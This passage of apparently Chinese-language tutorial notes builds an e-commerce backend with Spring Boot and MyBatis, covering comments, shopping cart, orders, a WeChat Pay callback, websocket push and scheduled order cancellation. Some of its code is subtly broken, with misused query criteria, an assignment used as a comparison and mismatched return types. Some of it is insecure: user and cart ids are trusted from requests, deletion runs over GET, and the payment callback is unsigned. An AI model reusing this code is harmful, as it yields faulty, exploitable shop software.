c.is_show from product_comments c INNER JOIN users u ON u.user_id = c.user_id WHERE c.product_id =#&#123;productId&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; serevice 添加实体类ProductCommentsVO @Data @AllArgsConstructor @NoArgsConstructor public class ProductCommentsVO &#123; private String commId; private String productId; private String productName; private String orderItemId; private Integer isAnonymous; private Integer commType; private Integer commLevel; private String commContent; private String commImgs; private Date sepcName; private Integer replyStatus; private String replyContent; private Date replyTime; private Integer isShow; //封装评论对应的用户数据 private String userId; private String username; private String nickname; private String userImg; &#125; 添加分页实体类 @Data @NoArgsConstructor @AllArgsConstructor public class PageHelper&lt;T&gt; &#123; //总记录数 private int count; //总页数 private int pageCount; //分页数据 private List&lt;T&gt; list; &#125; Service的代码 @Override public ResultVO listCommontsByProductId(String productId,int pageNum,int limit) &#123; //List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId); //1.根据商品id查询总记录数 Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); int count = productCommentsMapper.selectCountByExample(example); //2.计算总页数（必须确定每页显示多少条 pageSize = limit） int pageCount = count%limit==0? count/limit : count/limit+1; //3.查询当前页的数据（因为评论中需要用户信息，因此需要连表查询---自定义） int start = (pageNum-1)*limit; List&lt;ProductCommentsVO&gt; list = productCommentsMapper.selectCommontsByProductId(productId, start, limit); return ResultVO.success(list); &#125; controller @ApiOperation(&quot;商品评价分页查询接口&quot;) @GetMapping(&quot;/detail-commonts/&#123;pid&#125;&quot;) public ResultVO getProductCommonts(@PathVariable(&quot;pid&quot;) String pid, @RequestParam(&quot;pageNum&quot;) int pageNum, @RequestParam(&quot;limit&quot;) int limit)&#123; return productCommontsService.listCommontsByProductId(pid, pageNum, limit); &#125; 接口测试 评价分析 对该商品的评价进行分类，分为好评中评和差评 响应数据如图所示，可以看出是单表查询 service @Override public ResultVO getCommentsCountByProductId(String productId) &#123; // 查询商品总数 Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); int total = productCommentsMapper.selectCountByExample(criteria); // 查询好评数 Example example1 = new Example(ProductComments.class); Example.Criteria criteria1 = example1.createCriteria(); criteria1.andEqualTo(&quot;productId&quot;,productId); criteria1.andEqualTo(&quot;commType&quot;, 1); int goodTotal = productCommentsMapper.selectCountByExample(example1); // 查询中评数 Example example2 = new Example(ProductComments.class); Example.Criteria criteria2 = example1.createCriteria(); criteria2.andEqualTo(&quot;productId&quot;,productId); criteria2.andEqualTo(&quot;commType&quot;, 0); int midTotal = productCommentsMapper.selectCountByExample(example2); // 查询差评数 Example example3 = new Example(ProductComments.class); Example.Criteria criteria3 = example1.createCriteria(); criteria3.andEqualTo(&quot;productId&quot;,productId); criteria3.andEqualTo(&quot;commType&quot;, -1); int badTotal = productCommentsMapper.selectCountByExample(example3); // 好评率 double percent = (Double.parseDouble(goodTotal+&quot;&quot;)/Double.parseDouble(total + &quot;&quot;)) * 100; String percentValue = (percent+&quot;&quot;).substring(0,(percent+&quot;&quot;).lastIndexOf(&quot;.&quot;)+3); HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;total&quot;, total); hashMap.put(&quot;goodTotal&quot;, goodTotal); hashMap.put(&quot;badTotal&quot;, badTotal); hashMap.put(&quot;midTotal&quot;, midTotal); hashMap.put(&quot;percent&quot;, percentValue); return ResultVO.success(hashMap); &#125; controller @ApiOperation(&quot;商品总体评价信息查询接口&quot;) @GetMapping(&quot;/detail-commontscount/&#123;pid&#125;&quot;) public ResultVO getProductCommontscount(@PathVariable(&quot;pid&quot;) String pid)&#123; return productCommontsService.getCommentsCountByProductId(pid); &#125; 1.9 购物车业务添加购物车 Service private SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;); @Override public ResultVO addShoppingCart(ShoppingCart cart) &#123; cart.setCartTime(sdf.format(new Date())); int i = shoppingCartMapper.insert(cart); if(i&gt;0)&#123; return new ResultVO(ResStatus.OK,&quot;success&quot;,null); &#125;else&#123; return new ResultVO(ResStatus.NO,&quot;fail&quot;,null); &#125; Controller @PostMapping(&quot;/add&quot;) public ResultVO addShoppingCart(@RequestBody ShoppingCart cart)&#123; ResultVO resultVO = shoppingCartService.addShoppingCart(cart); return resultVO; &#125; 获取购物车列表 sql select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props,p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c inner JOIN product p INNER JOIN product_sku s INNER JOIN product_img i ON c.product_id &#x3D; p.product_id AND c.sku_id&#x3D;s.sku_id AND c.product_id&#x3D;i.item_id WHERE c.user_id &#x3D; 1 AND i.is_main&#x3D;1 dao 创建一个新的实体类用于保存返回的数据 @Data @NoArgsConstructor @AllArgsConstructor public class ShoppingCartVO &#123; private Integer cartId; private String productId; private String skuId; private String userId; private String cartNum; private String cartTime; private BigDecimal productPrice; private String skuProps; private String productName; private String productImg; private double originalPrice; private double sellPrice; private String skuName; private int skuStock; //库存 &#125; mapper public List&lt;ShoppingCartVO&gt; selectShopcartByUserId(int userId); xml &lt;resultMap id=&quot;ShoppingCartVOMap&quot; type=&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;&gt; &lt;id column=&quot;cart_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;cartId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;cart_num&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartNum&quot; /&gt; &lt;result column=&quot;cart_time&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartTime&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;sku_props&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuProps&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectShopcartByUserId&quot; resultMap=&quot;ShoppingCartVOMap&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where user_id = #&#123;userId&#125; and i.is_main=1 &lt;/select&gt; service @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listShoppingCartsByUserId(int userId) &#123; List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByUserId(userId); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;success&quot;, list); return resultVO; &#125; controller @GetMapping(&quot;/list&quot;) @ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true) public ResultVO list(Integer userId,@RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.listShoppingCartsByUserId(userId); return resultVO; &#125; 更新购物车 更新购物车发送的请求如下，由分析可以看出url的格式如下，并且发送的是put请求 /shopcart/update/&#123;cartId&#125;/&#123;num&#125; sql 使用update方法对对应的购物车记录进行修改即可 update shopping_cart set cart_num=3 where cart_id=1 dao xml &lt;select id=&quot;selectShopcartByUserId&quot; resultMap=&quot;ShoppingCartVOMap&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where user_id = #&#123;userId&#125; and i.is_main=1 &lt;/select&gt; &lt;update id=&quot;updateCartnumByCartid&quot;&gt; update shopping_cart set cart_num=#&#123;cartNum&#125; where cart_id=#&#123;cartId&#125; &lt;/update&gt; mapper public int updateCartnumByCartid(@Param(&quot;cartId&quot;) int cartId, @Param(&quot;cartNum&quot;) int cartNum); service @Override public ResultVO updateCartNum(int cartId, int cartNum) &#123; int i = shoppingCartMapper.updateCartnumByCartid(cartId, cartNum); if(i&gt;0)&#123; return new ResultVO(ResStatus.OK,&quot;update success&quot;,null); &#125;else&#123; return new ResultVO(ResStatus.NO,&quot;update fail&quot;,null); &#125; &#125; controller @PutMapping(&quot;/update/&#123;cid&#125;/&#123;cnum&#125;&quot;) public ResultVO updateNum(@PathVariable(&quot;cid&quot;) Integer cartId, @PathVariable(&quot;cnum&quot;) Integer cartNum, @RequestHeader(&quot;token&quot;) String token)&#123; ResultVO resultVO = shoppingCartService.updateCartNum(cartId, cartNum); return resultVO; &#125; 获取购物车列表信息 当点击结算时，页面会跳转到结算页面，这里依然需要显示订单中的信息，但是这里需要的是批量结算，所以需要批量获取 从前端发起的请求可以看到cids为本次请求的所有购物车订单 响应结果如下 从中可以看到与获取购物车列表使用到的sql语句大致相同 sql select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id &#x3D; p.product_id and i.item_id&#x3D;p.product_id and c.sku_id&#x3D;s.sku_id where i.is_main&#x3D;1 and c.cart_id in (6,7) dao 创建新的实体类保存结果 /** * 新增 productName、productImg */ @Data @NoArgsConstructor @AllArgsConstructor public class ShoppingCartVO &#123; private Integer cartId; private String productId; private String skuId; private String userId; private String cartNum; private String cartTime; private BigDecimal productPrice; private String skuProps; private String productName; private String productImg; private double originalPrice; private double sellPrice; private String skuName; private int skuStock; //库存 &#125; Mapper中代码 public List&lt;ShoppingCartVO&gt; selectShopcartByCids(List&lt;Integer&gt; cids); xml &lt;resultMap id=&quot;ShoppingCartVOMap2&quot; type=&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;&gt; &lt;id column=&quot;cart_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;cartId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;cart_num&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartNum&quot; /&gt; &lt;result column=&quot;cart_time&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartTime&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;sku_props&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuProps&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;stock&quot; property=&quot;skuStock&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectShopcartByCids&quot; resultMap=&quot;ShoppingCartVOMap2&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where i.is_main=1 and c.cart_id in &lt;foreach collection=&quot;cids&quot; item=&quot;cid&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt; #&#123;cid&#125; &lt;/foreach&gt; &lt;/select&gt; service @Override public ResultVO listShoppingCartsByCids(String cids) &#123; // 将前端请求携带的字符串转换成int数组 List&lt;Integer&gt; cartIds = new ArrayList&lt;&gt;(); String[] strings = cids.split(&quot;,&quot;); for (String string : strings) &#123; cartIds.add(Integer.parseInt(string)); &#125; List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cartIds); return ResultVO.success(list); &#125; controller @GetMapping(&quot;/listbycids&quot;) @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true) public ResultVO listByCids(String cids, @RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.listShoppingCartsByCids(cids); return resultVO; &#125; 删除购物车 sql 删除数据时，可以批量删除也可以是单个删除，因此使用下面的sql语句 delete from shopping_cart where cart_id IN (10,11) dao public int deleteShopcartByCids(List&lt;Integer&gt; cids); &lt;delete id=&quot;deleteShopcartByCids&quot;&gt; delete from shopping_cart where cart_id in &lt;foreach collection=&quot;cids&quot; item=&quot;cid&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt; #&#123;cid&#125; &lt;/foreach&gt; &lt;/delete&gt; service @Override public ResultVO deleteShoppingCartsByCids(String cids) &#123; // 将前端请求携带的字符串转换成int数组 List&lt;Integer&gt; cartIds = new ArrayList&lt;&gt;(); String[] strings = cids.split(&quot;,&quot;); for (String string : strings) &#123; cartIds.add(Integer.parseInt(string)); &#125; int i = shoppingCartMapper.deleteShopcartByCids(cartIds); if(i &gt; 0)&#123; return ResultVO.success(); &#125;else &#123; return ResultVO.failed(&quot;删除失败！&quot;); &#125; &#125; controller @GetMapping(&quot;/delete&quot;) @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true) public ResultVO deletebycids(String cids, @RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.deleteShoppingCartsByCids(cids); return resultVO; &#125; 前端代码 由于该功能没有再前端实现因此在shopcart.html页面中加入如下js代码 deleteByIds: function () &#123; if (this.opts.length == 0) &#123; alert(&quot;请选择要购买的商品！&quot;) &#125; else &#123; //1.获取选择购物车记录的id [0,2] ---&gt; cartId 8 cartId 10 --- 8,10, var cids = &quot;&quot;; for (var i = 0; i &lt; this.opts.length; i++) &#123; var index = this.opts[i]; var cartId = this.shopcarts[index].cartId; if (i &lt; this.opts.length - 1) &#123; cids = cids + cartId + &quot;,&quot;; &#125; else &#123; cids = cids + cartId; &#125; &#125; var url = baseUrl + &quot;shopcart/delete/?cids=&quot; + cids; axios(&#123; url: url, method: &quot;get&quot;, headers: &#123; token: this.token &#125; &#125;).then((res) =&gt; &#123; console.log(res); if (res.data.code = 10000) &#123; //重新刷新购物车 this.getShoppingCartList(); &#125; &#125;); &#125; &#125; 接口测试 1.10 收货地址获取收获地址直接根据用户id即可获取到收获地址，所以这里直接使用tkMapper生成的即可。 service @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listAddrsByUid(int userId) &#123; Example example = new Example(UserAddr.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;userId&quot;,userId); criteria.andEqualTo(&quot;status&quot;,1); List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;success&quot;, userAddrs); return resultVO; &#125; controller @GetMapping(&quot;/list&quot;) @ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true) public ResultVO list(Integer userId,@RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = userAddrService.listAddrsByUid(userId); return resultVO; &#125; 1.11 订单业务 订单添加接口 数据库操作 根据收获地址的id，获取地址信息 根据购物车id，查询购物车的详细信息（关联商品名称，sku，库存，商品图片，价格），用于生成订单快照 保存订单 保存商品快照 修改库存 service /** * 保存订单业务 * @param cids * @param order * @return * @throws SQLException */ @Transactional public ResultVO addOrder(String cids, Orders order) throws SQLException &#123; //处理cids String[] strings = cids.split(&quot;,&quot;); List&lt;Integer&gt; cidsInt = new ArrayList&lt;&gt;(); for (String string : strings) &#123; cidsInt.add(Integer.parseInt(string)); &#125; // 查询与当前订单相关联的购物车记录 List&lt;ShoppingCartVO&gt; shopcartList = shoppingCartMapper.selectShopcartByCids(cidsInt); // 判断商品库存是否充足 boolean flag = true; String untitle = &quot;&quot;; // 保存所有商品的名称 最后保存到订单快照中 for (ShoppingCartVO cartVO : shopcartList) &#123; if(Integer.parseInt(cartVO.getCartNum()) &gt; cartVO.getSkuStock())&#123; flag = false; &#125; untitle = untitle + cartVO.getProductName() + &quot;,&quot;; &#125; if(flag)&#123; // 库存充足 则保存订单 // userId // untitle // 支付时间 // 收货人的信息 // 总价格 // 支付方式（1） // 支付状态（待支付） order.setUntitled(untitle); order.setCancelTime(new Date()); order.setStatus(&quot;1&quot;); String orderId = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;); order.setOrderId(orderId); int i = ordersMapper.insert(order); // 生成商品快照 for (ShoppingCartVO sc: shopcartList) &#123; int cnum = Integer.parseInt(sc.getCartNum()); String itemId = System.currentTimeMillis()+&quot;&quot;+ (new Random().nextInt(89999)+10000); OrderItem orderItem = new OrderItem(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), new BigDecimal(sc.getSellPrice()), cnum, new BigDecimal(sc.getSellPrice() * cnum), new Date(), new Date(), 0); orderItemMapper.insert(orderItem); //增加商品销量 &#125; // 扣减库存 // 使用当前库存减去商品数量 for (ShoppingCartVO cartVO : shopcartList) &#123; String skuId = cartVO.getSkuId(); int newStock = cartVO.getSkuStock() - Integer.parseInt(cartVO.getCartNum()); Example example = new Example(ProductSku.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;skuId&quot;, skuId); // ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId); // productSku.setStock(newStock); // int k = productSkuMapper.updateByExample(productSku, example); ProductSku productSku = new ProductSku(); productSku.setStock(newStock); productSku.setSkuId(skuId); int k = productSkuMapper.updateByPrimaryKeySelective(productSku); &#125; //购买完成后 删除对应的购物车数据 for (Integer cid : cidsInt) &#123; shoppingCartMapper.deleteByPrimaryKey(cid); &#125; return ResultVO.success(&quot;生成订单成功！&quot;, orderId); &#125;else &#123; return ResultVO.failed(&quot;商品库存不足，请重新选择！&quot;); &#125; &#125; controller @PostMapping(&quot;/add&quot;) // @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;购物车id&quot;,required = true) public ResultVO list(String cids, @RequestBody Orders order)&#123; System.out.println(&quot;##################&quot;); System.out.println(cids); if(cids.contains(&quot;#&quot;))&#123; cids.replace(&quot;#&quot;, &quot;&quot;); &#125; System.out.println(cids); try &#123; Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order); String orderId = orderInfo.get(&quot;orderId&quot;); if(orderId !=null)&#123; Map&lt;String , String&gt; data = new HashMap&lt;&gt;(); data.put(&quot;body&quot;,orderInfo.get(&quot;productNames&quot;)); //商品描述 data.put(&quot;out_trade_no&quot;,orderId); //使⽤当前⽤户订单的编号作为当前⽀付交易的交易号 data.put(&quot;fee_type&quot;,&quot;CNY&quot;); //⽀付币种 data.put(&quot;total_fee&quot;, order.getActualAmount()*100 + &quot;&quot; ); //⽀付⾦额 data.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); //交易类型 data.put(&quot;notify_url&quot;,&quot;/pay/success&quot;); //设置⽀付完成时的回调⽅法 WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //发送请求 System.out.println(resp); String code_url = resp.get(&quot;code_url&quot;); orderInfo.put(&quot;code_url&quot;, code_url); return ResultVO.success(orderInfo); &#125;else &#123; return ResultVO.failed(&quot;订单为空！&quot;); &#125; &#125; catch (SQLException throwables) &#123; return ResultVO.failed(&quot;添加订单失败！&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); return ResultVO.failed(&quot;添加订单失败！&quot;); &#125; &#125; 支付回调 当用户支付成功后，支付平台会向服务器的指定接口发送支付订单的支付状态数据 创建控制器并定义回调接口 package com.qfedu.fmmall.controller; import com.github.wxpay.sdk.WXPayUtil; import com.qfedu.fmmall.entity.Orders; import com.qfedu.fmmall.service.OrderService; import com.qfedu.fmmall.vo.ResultVO; import io.swagger.annotations.Api; import io.swagger.annotations.ApiImplicitParam; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import java.io.IOException; import java.sql.SQLException; import java.util.HashMap; import java.util.Map; @RestController @RequestMapping(&quot;/pay&quot;) @Api(value = &quot;用户地址接口&quot;,tags = &quot;用户地址管理&quot;) @CrossOrigin public class PayController &#123; @Autowired private OrderService orderService; @GetMapping(&quot;/callable&quot;) public String success(HttpServletRequest request) throws Exception &#123; ServletInputStream is = request.getInputStream(); byte[] bytes = new byte[1024]; int len = -1; StringBuilder builder = new StringBuilder(); while((len = is.read(bytes)) != -1)&#123; builder.append(new String(bytes, 0 ,len)); &#125; String s = builder.toString(); // 使用wxpay的工具类讲xml的响应结果 转换成map Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s); if(map != null &amp;&amp; &quot;success&quot;.equalsIgnoreCase(map.get(&quot;result_code&quot;)))&#123; // 支付成功 // 修改订单状态为代发货/已支付 String orderId = map.get(&quot;out_trade_no&quot;); int i = orderService.updateOrderStatus(orderId, &quot;2&quot;); if(i&gt;0)&#123; // 响应微信平台 HashMap&lt;String, String&gt; resp = new HashMap&lt;&gt;(); resp.put(&quot;return_code&quot;, &quot;success&quot;); resp.put(&quot;return_msg&quot;, &quot;OK&quot;); resp.put(&quot;appid&quot;, map.get(&quot;appid&quot;)); resp.put(&quot;result_code&quot;, &quot;success&quot;); String s1 = WXPayUtil.mapToXml(resp); return s1; &#125; &#125; return null; &#125; &#125; 设置回调的url ** 这里涉及到内网穿透的知识点，但是如果部署到云服务器上的可以忽略这一步 订单状态查询该接口实现比较简单 service @Override public ResultVO getOrderById(String orderId) &#123; Orders orders = ordersMapper.selectByPrimaryKey(orderId); return ResultVO.success(orders.getStatus()); &#125; controller @GetMapping(&quot;/status/&#123;oid&#125;&quot;) public ResultVO getStatus(@PathVariable(&quot;oid&quot;) String oid, @RequestHeader(&quot;token&quot;) String token)&#123; return orderService.getOrderById(oid); &#125; 测试接口 websocket消息推送 创建webSocket服务器 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt; &lt;/dependency&gt; 添加websocket服务节点配置（Java配置⽅式） package com.qfedu.fmmall.websocket; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.socket.server.standard.ServerEndpointExporter; @Configuration public class WebSocketConfig &#123; @Bean public ServerEndpointExporter getServerEndpointExporter()&#123; return new ServerEndpointExporter(); &#125; &#125; 创建websocket服务器 package com.qfedu.fmmall.websocket; import org.springframework.context.annotation.Bean; import org.springframework.stereotype.Component; import javax.websocket.OnClose; import javax.websocket.OnOpen; import javax.websocket.Session; import javax.websocket.server.PathParam; import javax.websocket.server.ServerEndpoint; import java.util.concurrent.ConcurrentHashMap; @Component @ServerEndpoint(&quot;/webSocket/&#123;oid&#125;&quot;) public class WebSocketServer &#123; private static ConcurrentHashMap&lt;String,Session&gt; sessionMap = new ConcurrentHashMap&lt;&gt;(); /**前端发送请求建立websocket连接，就会执行@OnOpen方法**/ @OnOpen public void open(@PathParam(&quot;oid&quot;) String orderId, Session session)&#123; System.out.println(&quot;------------建立连接：&quot;+orderId); sessionMap.put(orderId,session); &#125; /**前端关闭页面或者主动关闭websocket连接，都会执行close**/ @OnClose public void close(@PathParam(&quot;oid&quot;) String orderId)&#123; sessionMap.remove(orderId); &#125; public static void sendMsg(String orderId,String msg)&#123; try &#123; Session session = sessionMap.get(orderId); session.getBasicRemote().sendText(msg); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; 在PayController中添加使用websocket与前端通信的代码 订单超时取消-定时任务 当用户提交订单后，没有在规定时间内进行支付操作，该订单讲自动取消，还原商品库存信息 定时任务(quartz） 延时队列（MQ） 首先查询已失效的未支付订单 订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时， 如果订单的创建时间不在此范围内则属于失效的订单 需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能 出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若已经支付则修改支付状态为已支付（2） 若仍然是未支付则取消订单，取消订单后需要修改订单状态 为支付失败(6)，并向支付平台通知取消支付链接，恢复商品的库存，就是ProductSku.stock + OrderItem.buy_conuts 这里需要考虑到数据库的并发问题，需要加锁和事务管理，隔离级别是 串行化，以保证数据的正确性和一致性 dao @Transactional(isolation = Isolation.SERIALIZABLE) // 隔离级别是 串行化 public void closeOrder(String orderId) &#123; synchronized (this)&#123; Orders orders = ordersMapper.selectByPrimaryKey(orderId); orders.setStatus(&quot;6&quot;); orders.setCloseType(1); // 失败原因未支付 // 将订单状态改为支付失败 ordersMapper.updateByPrimaryKeySelective(orders); // 根据订单id查询商品快照 Example example = new Example(OrderItem.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;orderId&quot;, orderId); List&lt;OrderItem&gt; orderItems = orderItemMapper.selectByExample(example); for (OrderItem orderItem : orderItems) &#123; String skuId = orderItem.getSkuId(); ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId); productSku.setStock(productSku.getStock() + orderItem.getBuyCounts()); productSkuMapper.updateByPrimaryKeySelective(productSku); &#125; &#125; &#125; service @Scheduled(cron = &quot;0/60 * * * * ?&quot;) public void checkAndCloseOrder() &#123; // 首先查询已失效的未支付订单 // 订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时， // 如果订单的创建时间不在此范围内则属于失效的订单 // 需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能 // 出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若仍然是 未支付 则取消订单 // 取消订单后需要修改订单状态 为支付失败(6)，并向支付平台通知取消支付链接 // 取消订单后，需要恢复商品的库存，就是ProductSku中的stock + OrderItem(订单快照)中的buy_conuts // 这里需要考虑到数据库的并发问题，需要加锁和事务管理 // 1.查询超过三十分钟未支付订单 try&#123; System.out.println(&quot;1——————————————————————----1&quot;); Example example = new Example(Orders.class); Example.Criteria criteria = example.createCriteria(); Date time = new Date(System.currentTimeMillis() - 30 * 60 * 1000); criteria.andLessThan(&quot;createTime&quot;, time); List&lt;Orders&gt; orders = ordersMapper.selectByExample(example); //2.访问微信平台接口，确认当前订单最终的支付状态 for (int i = 0; i &lt; orders.size(); i++) &#123; Orders order = orders.get(i); HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;(); params.put(&quot;out_trade_no&quot;, order.getOrderId()); // 使用微信支付提供发接口查询订单的支付状态 Map&lt;String, String&gt; resp = wxPay.orderQuery(params); if(&quot;SUCCESS&quot;.equalsIgnoreCase(resp.get(&quot;trade_state&quot;)))&#123; //2.1 如果订单已经支付，则修改订单状态为&quot;代发货/已支付&quot; status = 2 Orders updateOrder = new Orders(); updateOrder.setOrderId(order.getOrderId()); updateOrder.setStatus(&quot;2&quot;); ordersMapper.updateByPrimaryKeySelective(updateOrder); &#125;else if(&quot;NOTPAY&quot;.equalsIgnoreCase(resp.get(&quot;trade_state&quot;)))&#123; //2.2 如果确实未支付 则取消订单： // a.向微信支付平台发送请求，关闭当前订单的支付链接 Map&lt;String, String&gt; map = wxPay.closeOrder(params); System.out.println(map); // b.关闭订单 orderService.closeOrder(order.getOrderId()); &#125; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; 1.12 根据品牌筛选商品获取某个商品的所有品牌 sql 首先根据分类的category_id获取该分类下的所有商品，再从这些商品中获取到品牌名称 select product_id from product where category_id&#x3D; cid select select DISTINCT brand from product_params where product_id in cids &#x2F;&#x2F; 合并 select select DISTINCT brand from product_params where product_id in ( select product_id from product where category_id&#x3D; cid ) dao /** * 根据类别id查询此类别下的商品的品牌列表 * @param cid * @return */ public List&lt;String&gt; selectBrandByCategoryId(int cid); &lt;select 